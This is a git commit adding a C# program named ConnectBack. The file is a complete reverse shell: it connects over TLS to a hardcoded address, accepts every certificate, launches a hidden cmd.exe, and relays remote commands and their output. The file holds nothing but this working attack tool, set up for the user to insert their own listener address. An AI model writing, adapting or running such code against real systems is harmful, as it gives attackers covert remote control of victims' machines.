f1aae6851fb4d49e118c32102738666f7c4fef28
ApexPredator-InfoSec <84335647+ApexPredator-InfoSec@users.noreply.github.com>
2025-06-11 11:47:53 -0400

    Add files via upload

---
+++ Program.cs
@@ -0,0 +1,86 @@
+﻿using System;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.Net.Security;
+using System.Security.Cryptography.X509Certificates;
+
+
+namespace ConnectBack
+{
+    public class Program
+    {
+        static StreamWriter streamWriter;
+
+        public static void Main(string[] args)
+        {
+            string server = "192.168.163.131"; // Replace with your IP
+            int port = 443; // Replace with your port
+            using (TcpClient client = new TcpClient(server, port))
+            {
+                SslStream sslStream = new SslStream(
+                    client.GetStream(),
+                    false,
+                    new RemoteCertificateValidationCallback(ValidateCertificate)
+                    );
+                {
+                    sslStream.AuthenticateAsClient(server);
+                    Console.WriteLine("TLS handshake successful.");
+                    
+                    using (StreamReader reader = new StreamReader(sslStream))
+                    {
+                        streamWriter = new StreamWriter(sslStream);
+
+                        StringBuilder strInput = new StringBuilder();
+
+                        Process p = new Process();
+                        p.StartInfo.FileName = "cmd.exe";
+                        p.StartInfo.CreateNoWindow = true;
+                        p.StartInfo.UseShellExecute = false;
+                        p.StartInfo.RedirectStandardOutput = true;
+                        p.StartInfo.RedirectStandardInput = true;
+                        p.StartInfo.RedirectStandardError = true;
+                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                        p.Start();
+                        p.BeginOutputReadLine();
+
+                        while (true)
+                        {
+                            strInput.Append(reader.ReadLine());
+                            p.StandardInput.WriteLine(strInput);
+                            strInput.Remove(0, strInput.Length);
+                        }
+                    }
+                }
+            }
+        }
+
+        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder strOutput = new StringBuilder();
+
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    streamWriter.WriteLine(strOutput);
+                    streamWriter.Flush();
+                }
+                catch (Exception err) {
+                streamWriter.WriteLine(err.ToString());
+                }
+            }
+        }
+
+        private static bool ValidateCertificate(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors errors)
+        {
+            return true;  // **WARNING: Accepts ALL certificates**
+        }
+    }
+
+}
